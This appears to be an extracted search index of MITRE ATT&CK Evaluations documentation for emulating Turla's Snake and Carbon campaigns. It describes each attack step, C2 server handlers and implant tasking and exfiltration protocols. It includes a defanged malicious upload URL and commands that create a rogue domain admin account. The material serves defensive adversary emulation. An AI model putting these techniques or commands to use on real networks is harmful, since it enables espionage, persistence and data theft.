newsforum.servehttp[.]com/wordpress/wp-includes/css/img/upload.php)"]},{"l":"Infrastructure Diagram","p":["Carbon Infrastructure Diagram"]}],[{"i":"snake-emulation-scenario","l":"Snake Emulation Scenario \uD83D\uDCD6","p":["Based on open-source intelligence, the ATT&CK Â® Evaluations team created the below scenario leveraging techniques seen from Turla in the wild. We have adapted the scenario based on tools and resources available at the time. Below is a scenario overview, step-by-step breakdown, and an infrastructure diagram."]},{"l":"Overview","p":["This scenario is a continuation of Turlaâs multi-phase operation, as part of an ongoing intelligence collection campaign. The attackers establish a typo-squatting website to target entities with a high value of information. Turla targets the victim with a drive-by compromise, through user interaction Adobe Flash installer bundled with EPIC, is installed on the victimâs Windows workstation. EPIC communicates to the C2 server via proxy web server with HTTPS requests, persists via process injection, and performs enumeration on the victimâs workstation. SNAKE is then deployed to maintain foothold, elevate privileges and communicates to the C2 via HTTP/SMTP/DNS.","Next, the attackers move laterally onto a Microsoft IIS server, install SNAKE, and create an admin account. They then proceed to move laterally onto an Exchange workstation, and install SNAKE. Finally, the attackers move laterally onto an Exchange Server and install LIGHTNERON. LIGHTNERON enables email collection, and staging for exfiltrating stolen data via benign email PDF/JPG attachments. In this, the threat actors are able to collect and exfiltrate sensitive communications in an effort to identify new information sources and collect up-to-date information to further their the mission objectives.","Phase 1: EglÄ, an IIS Admin visits a legitimate but compromised website. The website contains a JavaScript that fingerprints users with an MD5 hash. Now identified as a target, the next time EglÄ visits the website, the JavaScript initiates a drive-by compromise via malicious adobe flash installer. Through EglÄ's interaction, the malicious Adobe Flash installer bundled with EPIC, is installed on the victim Windows workstation. EPIC begins to communicate with the C2 server via proxy web server with HTTPS requests.","Phase 2: EPIC persists via process injection, conducting defense evasion, specifically searching for commonly named processes associated with network defense applications and executing guardrails to not persist on previously infected devices. The attackers then use EPIC to perform enumeration on EglÄ's workstation. The results are saved in a zip file for exfiltration, then deleted after exfiltration. Next, SNAKE is deployed as second-stage malware on EglÄ's workstation to maintain a foothold and elevate privileges while communicating with C2 via HTTP/SMTP/DNS. With Kernel access via SNAKE, the attackers collect user log-in information from EglÄ's workstation, enabling the collection and compromise of valid accounts.","Phase 3: An account found on EglÄ's workstation is used to laterally move onto the Microsoft IIS server. SNAKE is installed on the IIS server and the attackers create their own admin account, gaining unrestricted access on the network. Next, the attackers laterally move to Å½ilvinas' Exchange Workstation and install SNAKE. A new user account Leshy is created under the domain admin group. The attackers then laterally move onto the Exchange Server and install LightNeuron. Rule modification from LIGHTNERON enables collection and staging for exfiltration. LIGHTNEURON exfiltrates stolen data via benign email PDF/JPG attachments to attacker-controlled email addresses.","Snake Operations Flow Diagram","Snake Software Flow Diagram"]},{"i":"scenario-steps","l":"Scenario Steps\uD83D\uDC63","p":["Clicky Jscript Evercookie EPIC","Commands","https://artemonsecurity.com/snake_whitepaper.pdf","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2014/08/20082358/uroburos.pdf https://artemonsecurity.com/snake_whitepaper.pdf https://public.gdatasoftware.com/Web/Content/INT/Blog/2014/02_2014/documents/GData_Uroburos_RedPaper_EN_v1.pdf https://www.circl.lu/pub/tr-25 https://www.gdatasoftware.com/blog/2014/03/23966-uroburos-deeper-travel-into-kernel-protection-mitigation https://www.gdatasoftware.com/blog/2014/06/23953-analysis-of-uroburos-using-windbg https://www.gdatasoftware.com/blog/2015/01/23926-analysis-of-project-cobra https://blog.tetrane.com/2019/Analysis-Uroburos-Malware-REVEN.html https://blog.talosintelligence.com/2014/04/snake-campaign-few-words-about-uroburos.html https://www.lastline.com/labsblog/dissecting-turla-rootkit-malware-using-dynamic-analysis/ https://www.lastline.com/labsblog/turla-apt-group-gives-their-kernel-exploit-a-makeover/ https://github.com/hfiref0x/TDL https://www.coresecurity.com/core-labs/advisories/virtualbox-privilege-escalation-vulnerability https://unit42.paloaltonetworks.com/acidbox-rare-malware/","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2014/08/20082358/uroburos.pdf https://artemonsecurity.com/snake_whitepaper.pdf https://public.gdatasoftware.com/Web/Content/INT/Blog/2014/02_2014/documents/GData_Uroburos_RedPaper_EN_v1.pdf https://www.circl.lu/pub/tr-25/ https://www.gdatasoftware.com/blog/2014/03/23966-uroburos-deeper-travel-into-kernel-protection-mitigation https://www.gdatasoftware.com/blog/2014/06/23953-analysis-of-uroburos-using-windbg https://www.gdatasoftware.com/blog/2015/01/23926-analysis-of-project-cobra https://blog.tetrane.com/2019/Analysis-Uroburos-Malware-REVEN.html https://blog.talosintelligence.com/2014/04/snake-campaign-few-words-about-uroburos.html https://www.lastline.com/labsblog/dissecting-turla-rootkit-malware-using-dynamic-analysis/ https://www.lastline.com/labsblog/turla-apt-group-gives-their-kernel-exploit-a-makeover/ https://github.com/hfiref0x/TDL https://www.coresecurity.com/core-labs/advisories/virtualbox-privilege-escalation-vulnerability https://unit42.paloaltonetworks.com/acidbox-rare-malware/","https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Visiting-The-Snake-Nest.pdf https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/ https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/ https://github.com/samyk/evercookie https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf https://securelist.com/analysis/publications/65545/the-epic-turla-operation/ https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/waterbug-attack-group.pdf https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/waterbug-espionage-governments https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf","https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf","https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf","LIGHT NEURON","PSExec Mimikatz","Reporting","SNAKE","Snake downloads LightNeuron and associated the Powershell installation script and config files, transfers them to the Exchange server, drebule, and remotely executes the installation script using WMI to install LightNeuron on the Exchange server.","Snake downloads Mimikatz to the file server, berzas ( 10.100.30.204), and extracts all NTLM hashes on the target to a file. That file is then exfiltrated back to the C2 server.","Snake performs lateral movement to the domain admin's workstation and enables additional persistence by creating a new domain admin account. The retrieved NTLM hash discovered in the previous step is used in a pass-the-hash attack to move laterally to Zilvinas's workstation. PsExec is employed via pass-the-hash to execute and install the Snake rootkit on the target workstation. Once the admin workstation has been compromised, Snake is used to enumerate processes running on Zilvinas's workstation uosis, where it is discovered that ZilvinasAdmin has processes running which can be used for token impersonation. By impersonating ZilvinasAdmin, a new domain user Leshy is created and added to the Domain Admins domain group for persistence.","SNAKE Powershell","SNAKE PSExec","Software","Step 11 Initial Compromise & Establish Foothold T1189: Drive-by Compromise T1204.001: User Execution T1071.001: Application Layer Protocol: Web Protocols T1090.002: Proxy: External Proxy T1071.001: Application Layer Protocol: Web Protocols T1082: System Information Discovery","Step 12 Rootkit Installation T1105: Ingress Tool Transfer T1014: Rootkit T1027: Obfuscated Files or Information T1070: Indicator Removal T1140: Deobfuscate/Decode Files or Information T1546: Event Triggered Execution T1543.003: Create or Modify System Process: Windows Service T1553.006: Subvert Trust Controls: Code Signing Policy Modification T1055.001: Process Injection: Dynamic-link Library Injection T1573.001: Encrypted Channel: Symmetric Cryptography T1071.001: Application Layer Protocol: Web Protocols T1070.004: Indicator Removal: File Deletion","Step 13 First Workstation Discovery T1106: Native API T1057: Process Discovery T1559: Inter-Process Communication T1087.002: Account Discovery: Domain Account T1049: System Network Connections Discovery T1134.002: Access Token Manipulation: Create Process with Token T1134.001: Access Token Manipulation: Token Impersonation/Theft","Step 14 Lateral Movement to File Server T1078.002: Valid Accounts: Domain Account T1559: Inter-Process Communication T1105: Ingress Tool Transfer T1569.002: System Services: Service Execution T1071.001: Application Layer Protocol: Web Protocols T1070.004: Indicator Removal: File Deletion","Step 15 Domain Discovery T1018: Remote System Discovery T1059.001: Command and Scripting Interpreter: PowerShell T1069.001: Permission Group Discovery: Domain Groups T1087.002: Account Discovery: Domain Account","Step 16 Preparation for Lateral Movement to Admin Workstation T1105: Ingress Tool Transfer T1559: Inter-Process Communication T1003.001: OS Credential Dumping: LSASS Memory","Step 17 Lateral Movement to Admin Workstation & Persistence T1057: Process Discovery T1136.002: Create Account: Domain Account T1550.002: Use Alternate Authentication Material: Pass the Hash T1071.001: Application Layer Protocol: Web Protocols T1070.004: Indicator Removal: File Deletion","Step 18 Lateral Movement to Exchange Server T1559: Inter-Process Communication T1105: Ingress Tool Transfer T1070.004: Indicator Removal: File Deletion T1047: Windows Management Instrumentation T1059.001: Command and Scripting Interpreter: PowerShell T1505.002: Server Software Component: Transport Agent T1036.005: Masquerading: Match Legitimate Name or Location","Step 19 Discovery & Email Collection T1119: Automated Collection T1114.002: Email Collection: Remote Email Collection T1001.002: Data Obfuscation: Steganography T1071.003: Application Layer Protocol: Mail Protocols T1016: System Network Configuration Discovery T1564.008: Email Hiding Rules T1573.001: Encrypted Channel: Symmetric Cryptography T1041: Exfiltration Over C2 Channel T1059.003: Command and Scripting Interpreter: Windows Command Shell","Steps & Techniques","The Snake rootkit receives tasking from the C2 server to enumerate currently running processes on the local computer and finds that EgleAdmin has processes running. Further enumeration of the EgleAdmin user shows that it is a member of the File Server Admins group. Snake then enumerates mapped drives on the local machine and finds that Egle's home drive is mapped to the file server, berzas ( 10.100.30.204).","The Snake rootkit receives tasking from the C2 server to use Powershell's ActiveDirectory module to enumerate domain users, admin groups, and computers. Upon discovering Zilvinas's regular and domain admin accounts, Snake will enumerate further details on the accounts. Snake then discovers a workstation, uosis ( 10.100.40.102), belonging to Zilvinas to use as a future lateral movement target.","Turla sends several discovery commands to the LightNeuron implant and collecting and exfiltrating email traffic. Emails with JPG attachments containing AES encrypted commands embedded using stegonagraphy are sent from the C2 server to the domain. LightNeuron's transport agent processes all emails via LightNeuron's companion DLL, which executes the embedded command and blocks delivery of the email from the C2 server. LightNeuron automatically collects all emails with recipients matching nk.local in a log file( C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Temp\\msmdat.xml).Eventually, LightNeuron is tasked to exfiltrate the email log, which is exfiltrated over the existing C2 channel.","User Egle on WIN10 workstation ( 10.100.40.103) Azuolas visits a legitimate, but compromised website nato-int.com. This website was tampered to redirect visitors to a typo-squated malicious website that contains javascript (JS). The malicious website anto-int.com. fingerprints Egle. This malicious WordPress website prompts Egle with a notice to update their NotFlash. Egle clicks to download the update, NTFVersion_e5.exe, containing EPIC (a.k.a. Tavdig/Wipbot). Epic will inject its guard DLL into explorer.exe. it will then search for processes that are typically internet enabled (e.g. iexplore.exe, msedge.exe, or firefox.exe) and inject an embedded worker DLL. Once C2 communications have been established between EPIC and the C2 via the proxy server, discovery is performed on the first host where information about the host device and domain computers is collected.","User Story","Using access from EPIC by Egle on WIN10 workstation Azuolas, SNAKE is pulled down to Azuolas as second-stage malware. The Snake installer will escalate privileges to SYSTEM by exploiting a Windows 10 vulnerability. Once running as SYSTEM, the installer will disable DSE by loading and exploiting a vulnerable driver. Once DSE is disabled, the installer will load the Snake rootkit driver. The rootkit driver will hook various functions and will inject a user-mode DLL into a SYSTEM process to execute received tasks from the C2 server. The driver will then wait for a browser process to make a network request to inject the user-mode DLL into the browser for C2 communications over HTTP. The injected DLLs will communicate between each other via named pipes. At some point, Egle will browse to a website, triggering the rootkit driver to inject the user-mode DLL into the browser process - this DLL will begin communication with the C2 server over HTTP.","Using this information, Snake impersonates the EgleAdmin account to run PsExec and execute another copy of the Snake rootkit installer on the file server, berzas. This new copy of the Snake installer will have the installed rootkit beacon back to the C2 server via a different redirector.","whoami tasklist.exe net user leshy Password12345 /add /domain net group \\Domain Admins\\ leshy /add /domain","whoami tasklist.exe net.exe user /domain EgleAdmin","WMI SNAKE LIGHT NEURON Powershell"]},{"l":"Infrastructure Diagram","p":["Snake Infrastructure Diagram"]}],[{"l":"Resources","p":["The Resources directory contains the following:","Source code used for the components of the emulated attack","Documentation on building source code and details on usage","Backend components such as the control server","Documentation for the environment setup","Each component has one or more additional documents specific to that resource."]},{"l":"Resources Index","p":["Binaries","caldera_port","Carbon","CertificateAuthority.md","cleanup","control_server","DNS.md","EmailFlow.md","EPIC","GettingStarted.md","Infrastructure Setup","Infrastructure-Overview.md","Keylogger","LightNeuron","Mimikatz","payloads","Penquin","README.md","Setup-Carbon.md","Setup-RedTeam.md","Setup-Snake.md","Setup-Support.md","Snake","TrafficRedirection.md","WindowsService.md"]}],[{"i":"attck-evaluations-control-server","l":"ATT&CK Evaluations Control Server","p":["This ATT&CK Evaluations Control Server is used to execute behaviors under test during ATT&CK Evaluations.","The Control Server provides features for generating implant stagers, controlling agents, and executing modules.","The Control Server is backed with a REST API to support automation and integration with other tools."]},{"l":"Handlers Contained","p":["The below handlers were developed specifically for this adversary's emulation plans. Each handler contains a readme describing configurations, cited research, and available commands.","Handler","Description","Carbon","This C2 handler is used for the Carbon implant in the Carbon Scenario used in ATT&CK Evaluations Enterprise Round 5","Epic","This C2 handler is used for the Epic implant in the Carbon & Snake Scenario used in ATT&CK Evaluations Enterprise Round 5","LightNeuron","This C2 handler is used for the LightNeuron implant in the Snake Scenario used in ATT&CK Evaluations Enterprise Round 5","Snake","This C2 handler is used for the Snake implant in the Snake Scenario used in ATT&CK Evaluations Enterprise Round 5"]},{"l":"Usage","p":["This repository is meant to act as a submodule within other adversary emulation or ATT&CK evaluation repositories. To use this control server repository, you may either run the binary as is or reference the entire repository as a submodule.","The control server expects the following folder structure for payloads/uploads:","File uploads will be stored in the files subdirectory of the current working directory of the C2 server. The repository already has this directory available, but you will need to create the folder before running the binary from a different location.","Payload downloads will be fetched from the payloads folder of the parent directory of the C2 server's working location. The repository does not contain this payload directory, since the end user will be responsible for providing the payloads according to their specific use case. Ensure that this folder exists in the parent directory when running the C2 server. For example, if the control server is being run from the Resources/control_server directory, the payloads must be placed in Resources/payloads/ in order for the handlers to successfully serve them. The SideTwist handler in particular expects its payloads to be in a separate SideTwist directory under the payloads directory (e.g. Resources/payloads/SideTwist)","The control server is configured using two configuration files - one for handler configuration and one for REST API configuration. By default, the control server will pull the handler configuration file from ./config/handler_config.yml and the REST API config from ./config/restAPI_config.yml.","You can tell the control server to pull from different config file paths using the -c or --config option to specify the handler config path and -r or --rest-config to specify the REST API config path as follows:"]},{"l":"Build from source","p":["To run with default config paths:","To specify config paths:"]},{"l":"Test Instructions","p":["Note: you may need to specify the full path to your golang binary if running under sudo.","For example:"]},{"l":"Usage Examples","p":["Enable C2 handlers and adjust configuration values to change IP address and ports to listen on by editing the default config/handler_config.yml file or by creating your own config YML file. To enable a handler, set enabled to true, like below:","To disable a handler, set enabled to false, like below:","Start the control server:","Using default config file paths:","To specify config paths:","Alternatively run direct from source:","Note: you may need to specify the full path to your golang binary if running under sudo.","For example:"]},{"l":"Installation Dependencies","p":["Install Go version 1.15 or higher.","Run tests from the main repository directory. Go should automatically fetch needed dependencies.","Note: you may need to specify the full path to your golang binary if running under sudo.","For example:","Look at the go.mod file if you want to see the dependencies in detail."]},{"i":"attck-evaluations-c2-client","l":"ATT&CK Evaluations C2 Client","p":["This client is provided to interact with the C2 server via its REST API."]},{"l":"Build Instructions","p":["Install dependencies using pip3:"]},{"i":"test-instructions-1","l":"Test Instructions"},{"i":"usage-examples-1","l":"Usage Examples","p":["Enable C2 handlers and adjust configuration values to change IP address and ports to listen on by editing the default config/handler_config.yml file or by creating your own config YML. To enable a handler, set enabled to true, like below:","To disable a handler, set enabled to false, like below:","Start the control server:","To specify config paths:","Establish an implant session","Run an implant program of your choice to connect to the C2 (make sure that the corresponding handler was enabled).","Run the client python script to manage implant sessions.","For specific instructions on tasking a particular implant, reference the appropriate README."]}],[{"l":"Carbon HTTP handler","p":["The Carbon HTTP C2 handler is the server-side counterpart for the Carbon implant and is specifically designed to interact with it over HTTP. The handler is configured to do the following:","respond to basic heartbeat requests at / to indicate server availability.","register a new implant at /javascript/* where * indicates any page when a PHPSESSID cookie is included. 1","indicate that a session exists for an existing implant at /javascript/* where * indicates any page when a PHPSESSID cookie is included.","return command instructions at /javascript/view.php when a PHPSESSID cookie is included. 1","process posted data at /javascript/ for requests with a valid PHPSESSID cookie.","accept tasking from ./evalsC2client.py and send to implants when requested."]},{"l":"Components","p":["4 byte int","bytes","Data Type","Description","Field","GET /, where the server is expecting heartbeat requests and will respond with 200 OK if it is up.","GET /javascript/*, where * indicates any page, where the server is listening for requests with a PHPSESSID cookie. The server will register new implant sessions using that PHPSESSID cookie value as the UUID or state that the session already exists. 1","GET /javascript/view.php, where the server is listening for requests with a PHPSESSID cookie. The server will return an HTML document with a task embedded, currently encoded in base64. 1","id","len_object_id","number of files to send","object_id","POST /javascript/ or POST /javascript/*, where the server is listening for requests with a PHPSESSID cookie and data. The server will attempt to process data sent with the POST request. The correct format for this data is as follows:","the data of the file being uploaded","The handler consists of an HTTP web server that listens on a specified address/port and serves the following URL endpoints:","the implant's ID","the length of the file being uploaded","the length of the implant's ID","the task ID","tmp_content","tmp_filesize","val"]},{"l":"Encryption","p":["When tasking the implant, the Carbon C2 handler will encrypt the task information before embedding the base64 blob in the response HTML. The tasking information is first encrypted using CAST128 and a randomly generated symmetric key. This key is then base64-encoded and encrypted using an RSA public key. The CAST128 ciphertext (with the IV prepended) is appended to the RSA ciphertext, and the result is base64-encoded and placed in the response HTML. 1, 2, 3","The following RSA public key is used (DER base64-encoded):","The 2048-bit RSA public/private key pair used for this implant was generated using Crypto++'s GenerateRandomWithKeySize method and then converted to DER format. To convert from DER to PEM format, you can use the following openssl commands:","When handling task output from the implant, the C2 handler will decrypt responses using the following hardcoded CAST-128 key:","Carbon DLL has used a similar encryption setup for C2 communication in the past 1, with additional components such as an intermediary signature block."]},{"l":"Usage"},{"l":"Building","p":["You can build the control server binary with the following command:"]},{"l":"Configuration","p":["To enable and configure the Carbon HTTP handler within the control server, edit the config/handler_config.yml from the main C2 server repo. Adjust the Carbon HTTP entry as needed.","Example:","Run the controlServer binary as sudo and look for success messages in starting up the Carbon handler."]},{"l":"Testing","p":["Unit tests are available for this handler in the carbon_http_test.go file. If you would like to run these tests, use the command sudo go test ./... in the evalsC2server directory, and the unit tests for the Carbon handler will be performed.","If you wish to test this handler manually, these are some sample curl commands that might be useful:","check that the server heartbeat functionality works:","check that the server creates a session for a new implant, responds to an existing session, and returns basic tasking output","check that the server is responding with the correct HTTP status in the case of an error","check that the server is able to process POST data correctly (out of date)"]},{"l":"Tasking","p":["cmd","code","Data Type","Description","Examples ( GUID represents the ID of the implant to task:","Field","id","int","optional, name of the server-side payload to deliver as part of the task. The file must reside in the Resources/payloads/carbon directory in the parent repository","optional, P2P routing blob","optional, path to save the payload on the victim machine. Must be provided if passing in payload","optional, task type code. Defaults to 0 if not provided. Can be from 1-99","payload","payload_dest","required, task ID","required, the command to execute","routing","string","The C2 handler will take care of building the appropriate config file using the provided payload and app information.","To submit a task for the to the C2 server, pass the task information to the REST API server in a JSON dictionary string containing the following fields 1:"]},{"l":"CTI References","p":["https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/","https://www.gdatasoftware.com/blog/2015/01/23926-analysis-of-project-cobra","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html"]}],[{"l":"Creating Your Own Handler","p":["The Evals C2 server is designed with customization in mind. Developers can easily add new handlers to the C2 server, and users can easily toggle which handlers to enable/disable and configure their settings. This guide describes how developers can add a new handler to the C2 server.","In this guide, we'll use an HTTP C2 handler as a basic example, and we'll call it examplehttphandler."]},{"l":"Add Your Handler Source Code","p":["Within the handlers folder, create a new folder for your C2 handler. In our case, we'll call it examplehttphandler. This folder will contain a Golang package for your C2 handler - all your handler source code and associated test files will go here.","We'll pretend that we created the following files for our demo C2 handler:","handlers/examplehttphandler/examplehttphandler.go","handlers/examplehttphandler/examplehttphandler_test.go"]},{"l":"Handler Init Function","p":["In one of your handler source code files, you will need to mark your C2 handler as an available handler in an init function. This way, when your handler package gets imported, the C2 server will know that your handler is available and where to reach it. You will also need to use a struct to represent your handler, as your handler will need to implement the util.Handler interface. The below code provides an example:","Note that we use a factory method to return our struct - this gives us more flexibility if we need to add more variables to our handler struct, and it allows easier handler creation in unit tests.","util.AvailableHandlers maps handler names ( string) to handler structs that implement the util.Handler interface. This means that our new handler must implement the util.Handler interface:","Since each handler may operate differently, we leave it up to the handler creaters to determine how to start and stop their handlers. The only requirements are the method signatures - both methods must return error if something goes wrong, and StartHandler must take in a string(the REST API server address) and a config.HandlerConfigEntry, which represents the handler config entry for our specific handler. You will not need to call these methods outside of your unit tests - main.go will handle that for you when starting up enabled C2 handlers.","For our HTTP handler, we can use StartHandler to listen on the address specified in our configuration entry (which we will create momentarily) and to serve URL paths of our choice. Feel free to reference other handler implementations to get an idea of how you can set up your C2 handler. StopHandler will take care of gracefully tearing down the handler components."]},{"l":"Register Our C2 Handler","p":["There are two steps for registering our C2 handler - creating a configuration entry and making sure our handler package gets imported."]},{"l":"Import Handler","p":["In order for the C2 server executable to incorporate our new handler code, we need to import the package so that the init function in our handler source code runs. We can do this by adding a new import statement in handler/handlers.go(change your package name accordingly):","The _ underscore in front of the import means that we're only importing the package for its side effects, in particular the init function. Remember that the init function is what stores our handler struct in the map of available handlers. handlers.go will not directly reference individual C2 handlers, so we can't use a typical import."]},{"l":"Config Entry","p":["config/handler_config.yml contains the configuration entries for all of the available handlers in the C2 server. Each entry is a dictionary that maps the handler name to an inner dictionary that maps a configuration setting name to its value.","For example:","In the above example, the handler name is sidetwist, and there are three configuration settings:","host- the IP address that the handler should bind to when listening for C2 traffic","port- the port that the handler should listen on","enabled: whether or not the handler should run when the C2 server starts up.","Since different handlers can use different protocols and methods for handling C2 traffic, you may see that some handlers have different settings in their config entries. The only one that is required is the enabled setting, since this tells the C2 server whether or not to run the handler.","When creating your own handler, think about what configuration settings it will need. If the C2 traffic will be over HTTP, perhaps you want to allow users to specify the host/port combination to listen on.","In this guide, we'll use an HTTP C2 handler as a basic example, and we'll call it examplehttphandler. Our config file entry will look as follows:","Note that we set enabled to true so that our handler will start up when the server is run. We'll simply add the above entry at the end of config/handler_config.yml."]},{"l":"Unit Tests","p":["Don't forget your unit tests! You will need to create unit tests for your new handler and update existing unit tests in handler/handlers_test.go to account for your newly available C2 handler:","The TestStartStopHandlers and TestStartStopHandlersSomeEnabled test functions will need to be updated so that the number of available C2 handlers reflects your newly added handler.","The auxiliary functions mockHandlerConfigFileReaderAllEnabled and mockHandlerConfigFileReaderSomeEnabled will also need to be updated to include dummy entries for your new handler.","When ready, run go test ./... in the main control server repo directory to confirm that all your tests are working."]},{"l":"Recompile binary","p":["Recompile the control server binary to include your new C2 handler and perform any additional testing.","Run go build -o controlServer main.go in the main directory to recompile, and run sudo ./controlServer to run the control server."]}],[{"i":"epic-https-handler","l":"Epic HTTP(S) Handler","p":["The Epic HTTP(S) C2 handler is the server-side counterpart for the Epic implant and is specifically designed to interact with it over HTTP or HTTPS."]},{"l":"Usage"},{"l":"Configuration","p":["To enable and configure the Epic HTTP(S) handler within the control server, edit the config/handler_config.yml from the main C2 server repo. Adjust the epic entry as needed.","HTTP example:","HTTPS example:","Run the controlServer binary as sudo and look for success messages in starting up the Epic handler."]},{"l":"Tasking","p":["To submit a task for the C2 server, use the following command format:","The key | value pair is converted into key = value format and placed into the configuration file portion of the server's response.","The optional args are used for specific commands, as detailed below.","The keys tell the implant what to do:","exe- tells the implant to execute the command contained in the value","result- tells the implant to upload the file that is located at the value","name- tells the implant receive a file that the handler is sending to it, with the value being the path that the file contents should be written to on the implant and an option arg telling the handler the file that it should send","del_task- tells the implant to delete the file that is located at the value","Note: The template for the EPIC C2 handler HTML response has been taken from here: https://securelist.com/the-epic-turla-operation/65545/"]},{"l":"Components","p":["The handler consists of an HTTP(S) web server that listens on a specified address/port and serves the following URL endpoints:","POST /, where the server expects a message from the implant that sends data to the server and allows the server to respond with tasking.","The implant sends the server a POST request with an encoded, encrypted, and compressed JSON in the body in the following format:","â NOTE: the first POST request from the implant is not encrypted, but is encoded and compressed.","The UUID field is empty if this is the first time the implant makes contact with the server; otherwise, it contains the UUID assigned to it by the server. To allow for reproducibility, the server has two hard coded UUIDs that it gives out to implants. The first UUID that is given out is 218780a0-870e-480e-b2c5dc, and the second is 51515228-8a7b-4226-e6e3f4. If a third implant is registered, the first implant will automatically be deregistered, and its UUID will be given to the third implant. When a fourth implant is registered, the second implant is deregistered, and its UUID is given to the fourth implant, and so on.","The type field contains the command type of the command that was executed to generate the data in the data field.","command- the data field contains the results of a command that was run.","upload- the data field contains the contents of the file to be uploaded.","download- the data field contains either a success or error message that indicates whether the implant was able to download the file.","delete- the data field contains either a success or error message that indicates whether the implant was able to delete the file.","The data field contains base64 encoded results from the command ran for the previous communication cycle.","The server will respond in the following binary format:","The command ID starts at 0 and increments for each command sent to the implant.","The payload is any executable that the implant should execute. It is sent as a base64-encoded string.","The configuration file is an ini file that contains any configuration information, including sending the implant's UUID and commands to execute."]},{"l":"Encryption","p":["EPIC tasking is AES-256 encrypted with a new session key and IV for every communication sent. The IV is prepended to the AES encrypted data. The AES session key is base64 encoded and RSA encrypted then prepended to the IV and AES encrypted data.","Altogether, the data transformations in pseudocode would look similar to the following:","The C2 server and the implant each have an RSA key pair. The keys were generated using the following commands:"]}],[{"l":"Light Neuron Handler","p":["The Light Neuron C2 handler is the server-side counterpart for the Light Neuron implant and is specifically designed to interact with it over email."]},{"l":"Components"},{"l":"Usage"},{"l":"Configuration","p":["To enable and configure the Light Neuron handler within the control server, edit the config/handler_config.yml from the main C2 server repo. Adjust the Light Neuron entry as needed.","host: The SMTP server used to send emails.","port: The SMTP server Port","mailFrom: The email address that will appear as the sender.","username: SMTP username","password: SMTP password","image_file_path: The path to the unmodified image used as the stego attachment.","watch_dir_path: The path on the C2 server that is polled for incoming mail attachments","recipientFilePath: The text file that holds a list of implant emails/sessions","encryption: [true/false] used to tell the handler to encrypt traffic or use plain text traffic.","Example:","Run the controlServer binary as sudo and look for success messages in starting up the LightNeuron handler:"]},{"l":"Registering Implants","p":["Since the LightNeuron implant doesn't beacon by design, implant session registration is approached different from other handlers. To register an implant session with the Lightneuron handler the handler configuration must have a recipientFilePath set. The recipient/target email addresses saved in the file will be registered with the C2 server when the server starts.","The file is a .txt documents that has a single target email per line.","Valid formatting for a recipientFilePath .txt:"]},{"l":"Tasking Implants","p":["To task an implant you need the GUID (in this case, the target email address), the command ID, and the command to execute.","The Implant will accept the following command ID's:","Command ID 2: This command will task the implant to delete a given file.","Command ID 3: This command ID is used to exfiltrate the email log file. It can be passed with a 0 or 1 flag.","0 will exfiltrate the file without deleting.","1 will exfiltrate the file then delete it.","Command ID 5: This command ID is used to execute a command on the target system.","File Deletion Example:","Email Exfiltration Example:","Command execution example:"]},{"l":"LightNeuron Stegonagraphy","p":["The light neuron implant uses a .jpg file to hide command and resulting output data inside. The data is stored at a particulate byte offset inside a \"container\". The container is a specified length of bytes prepended with the length so that the correct information can be read.","Container Layout:","The recieving end will read the container size and create variable to hold the container data. Fianlly, the recieving end will read the number of bytes contained in the container size resulting in clean output/command data.","This stegonagraphy process is bidirectional.","On the C2 side, to reduce bloat logged by the C2 server, if the output is above 1000 bytes then the entire output is written to a file. This allows for simple commands/output (eg. whoami, ipconfig) to output to the C2 log, but file exfiltration and large command output will go into specific files."]},{"l":"Testing"},{"l":"References","p":["This handler uses an external email library to create and send emails over smtp using Postfix https://github.com/xhit/go-simple-mail/v2"]}],[{"l":"Snake HTTP handler","p":["The Snake HTTP C2 handler is the server-side counterpart for the Snake implant and is specifically designed to interact with it over HTTP."]},{"l":"Components","p":["The handler consists of an HTTP web server that listens on a specified address/port and serves the following URL endpoints:","GET /PUB/{identifier}, where {identifier} is either a specific resource that the implant is requesting or the identifier for the implant. Requesting a resource of home.html indicates that the implant is performing a heartbeat check to see if the server is up, in which case the server will respond with 1. Otherwise, {identifier} is treated as the implant ID, and the server will use this value to determine if a new session is established or if an existing implant is checking in for additional tasking.","POST /IMAGES/3/{instruction_id} for submitting command output, implant logs, or a generic file upload for the instruction identified by {instruction_id}. The C2 server will determine if the instruction ID is for an assigned file upload - if so, the received data is stored under the same filename on the C2 server. If the instruction ID is not linked to an assigned file upload, the C2 server checks if it's one of the hardcoded log file IDs, in which case it accepts the upload as the associated log file. Otherwise, the C2 server assumes that the upload contains command output for the instruction. In this case, the C2 server will log the received command output if the instruction ID is mapped to an implant ID. On successful upload, the server will respond with 1. Note that when accepting log fiel uploads, the server will decode and decrypt each log line before writing the destination file on the server-side.","Regular C2 logs will be uploaded to /IMAGES/3/62810421015953103444 and saved under files/C2Log.YYYY-MM-DD-HH-MM-SS.log, where the timestamp represents the time the log was received. This prevents multiple log file uploads from overwring previous ones.","Execution logs will be uploaded to /IMAGES/3/23329841273669992682 and saved under files/ExecutionLog.YYYY-MM-DD-HH-MM-SS.log","Pipe server logs will be uploaded to /IMAGES/3/59463656487865612747 and saved under files/PipeServerLog.YYYY-MM-DD-HH-MM-SS.log","Pipe client logs will be uploaded to /IMAGES/3/16488587954892310865 and saved under files/PipeClientLog.YYYY-MM-DD-HH-MM-SS.log","GET /IMAGES/3/{instruction_id} to retrieve the payload associated with the given instruction ID. If no instruction with the ID is found, the C2 server will respond with an internal server error message. Note that the implant must be tasked with a payload download instruction before requesting the payload."]},{"l":"Encryption","p":["Turla has used XOR encryption for C2 communications with Snake 1, and we use a different XOR key:","The C2 handler uses XOR encryption in the following scenarios:","encrypting beacon responses containing 